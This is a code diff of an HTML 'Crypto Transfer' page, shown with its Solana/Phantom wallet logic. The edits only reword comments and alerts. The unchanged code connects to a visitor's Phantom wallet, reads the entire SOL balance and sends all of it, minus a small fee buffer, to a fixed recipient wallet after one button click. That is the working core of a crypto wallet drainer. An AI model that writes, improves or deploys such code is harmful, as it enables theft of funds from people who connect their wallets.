@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
     
-    <!-- Buffer Polyfill to Fix the "Buffer is not defined" Error -->
+    <!-- Buffer Polyfill -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/buffer.min.js"></script>
     <script>
         window.Buffer = buffer.Buffer;
@@ -23,29 +23,30 @@
 
         document.getElementById('transferBtn').addEventListener('click', async () => {
             try {
-                // Connect to Phantom wallet
+                // Check for Phantom wallet
                 const provider = window.phantom?.solana;
                 if (!provider || !provider.isPhantom) {
-                    alert('Phantom Wallet not found. Please install Phantom Wallet.');
+                    alert('Phantom Wallet not found. Please install and log in.');
                     return;
                 }
 
+                // Connect to Phantom wallet
                 const response = await provider.connect();
                 const senderPublicKey = new PublicKey(response.publicKey.toString());
 
                 // Get balance of SOL
                 const balance = await connection.getBalance(senderPublicKey);
                 if (balance <= 0) {
-                    alert('Insufficient balance.');
+                    alert('Insufficient SOL balance to complete the transaction.');
                     return;
                 }
 
-                // Prepare transaction
+                // Prepare the transaction
                 const transaction = new Transaction().add(
                     SystemProgram.transfer({
                         fromPubkey: senderPublicKey,
                         toPubkey: new PublicKey(recipientWallet),
-                        lamports: balance - 5000,  // Deducting fee buffer
+                        lamports: balance - 5000,  // Deducting fees buffer
                     })
                 );
 
@@ -53,12 +54,13 @@
                 const { blockhash } = await connection.getLatestBlockhash();
                 transaction.recentBlockhash = blockhash;
 
-                // Sign transaction
+                // Sign and send the transaction
                 const signedTransaction = await provider.signTransaction(transaction);
                 const signature = await connection.sendRawTransaction(signedTransaction.serialize());
 
-                alert(`Transaction submitted: https://explorer.solana.com/tx/${signature}?cluster=mainnet`);
+                alert(`Transaction sent! View here: https://explorer.solana.com/tx/${signature}?cluster=mainnet`);
             } catch (error) {
+                console.error("Transaction error:", error);
                 alert(`Error: ${error.message}`);
             }
         });
